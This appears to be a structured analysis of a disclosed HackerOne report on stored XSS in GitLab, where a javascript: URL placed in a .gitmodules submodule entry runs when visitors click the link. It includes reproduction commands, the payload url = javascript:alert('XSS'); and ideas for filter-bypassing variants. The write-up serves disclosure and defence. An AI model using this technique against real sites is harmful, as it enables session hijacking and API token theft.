# Stored XSS on Files Overview via Git Submodule URL Injection

## Metadata
- **Source:** HackerOne
- **Report:** 218872 | https://hackerone.com/reports/218872
- **Submitted:** 2017-04-05
- **Reporter:** jobert
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Unsafe URL Handling
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in GitLab's Files overview due to improper sanitization of git submodule URLs from .gitmodules files. An attacker with push access can inject a javascript: URL as a submodule URL, which executes when a user clicks the submodule link in the web interface. This allows arbitrary JavaScript execution in the victim's authenticated session.

## Attack scenario
1. Attacker gains push access to a GitLab project (either their own or through collaboration)
2. Attacker creates or clones the project repository locally and creates a .gitmodules file with a git submodule
3. Attacker modifies the .gitmodules file to replace the legitimate submodule URL with a malicious javascript: payload (e.g., 'javascript:alert("XSS")')
4. Attacker commits and pushes the modified .gitmodules file to the repository
5. Victim visits the Files overview page and clicks on the injected submodule directory link
6. The javascript: URL is executed in the victim's browser within their authenticated GitLab session, allowing token theft or API impersonation

## Root cause
GitLab's Files overview page fails to properly validate and sanitize git submodule URLs when rendering directory links. The application treats the URL from .gitmodules as a safe link without checking for javascript: protocols or other dangerous URL schemes, directly incorporating it into clickable HTML elements.

## Attacker mindset
An attacker seeks to compromise user sessions and steal authentication tokens. By leveraging the trust users place in the GitLab interface and the common practice of clicking repository links, they can execute arbitrary code in authenticated sessions. The attack requires only push access, making it accessible to contributors or collaborators, not just administrators.

## Defensive takeaways
- Implement strict whitelist validation for all URLs from external sources like .gitmodules, rejecting non-http/https schemes
- Always use safe DOM manipulation methods that escape URLs or use proper URL parsing libraries
- Apply Content Security Policy (CSP) headers to mitigate XSS impact
- Sanitize and validate all git configuration file contents before rendering in web interfaces
- Implement output encoding for all user-influenced or file-derived content
- Consider disabling javascript: protocol execution in links through security headers
- Add security warnings when displaying untrusted content from version control metadata

## Variant hunting
Check for similar XSS in other git metadata display (git hooks, git config, commit messages with special characters)
Look for unsafe URL handling in submodule breadcrumb navigation or file tree components
Test other git-related features that parse .gitmodules (submodule operations, dependency viewers)
Examine how other git hosting platforms (GitHub, Gitea, Gitbucket) sanitize submodule URLs
Search for data: URLs, vbscript: URLs, and other protocol handlers in similar contexts
Test SVG-based XSS payloads in submodule URLs that bypass basic javascript: filtering

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1204.001

## Notes
This is a classic stored XSS vulnerability with moderate exploitation difficulty (requires push access) but high impact (session hijacking). The vulnerability demonstrates the importance of treating all version control metadata as potentially hostile. The fact that git itself doesn't validate the URL scheme (only validates after fetch) creates a security boundary between git and web application responsibility that GitLab failed to enforce.

## Full report
<details><summary>Expand</summary>

# Vulnerability description
There's a stored Cross-Site Scripting (XSS) vulnerability in the Files overview of a project due to the incorrect handling of a git submodule. This allows an attacker to execute JavaScript in a visitor's session.

# Proof of concept
To reproduce the issue, the attacker needs to have a project with push access. To start, make sure you're signed in and have enabled the wiki. Now, clone both repositories:

```
git clone git@gitlab.com:user/project
git clone git@gitlab.com:user/project.wiki
```

Now `cd project.wiki`  and initialize the repository:

```
touch some-file
git add some-file
git commit -am "Added file to initialize wiki repository"
git push
```

Now repeat the same in the `project` directory add the `project.wiki` as a relative git submodule to `project`:

```
touch some-file
git add some-file
git commit -am "Added file to initialize project repository"
git push
git submodule add ../project.wiki wiki
git add wiki
git commit -am "Added relative wiki module"
git push
```

This will create a `.gitmodules` file with the following contents:

```
[submodule "wiki"]
  path = wiki
  url = ../project.wiki
```

In this file, the URL can be updated to a `javascript:` URL. It won't error because the contents of the submodule are already fetched by the `git submodule add` command. Lets change `url = ../project.wiki` to `url = javascript:alert('XSS');` (see F173589). Now commit the results and push the changes:

```
git add .
git commit -am "Updated relative URL"
git push
```

Now go to the project's Files overview: https://gitlab.com/user/project/tree/master. In the overview, click the `wiki` directory, and see the JavaScript getting executed:

{F173602}

# Impact
An attacker could offload the current user's API token and impersonate the user through the API.

</details>

---
*Analysed by Claude on 2026-05-12*
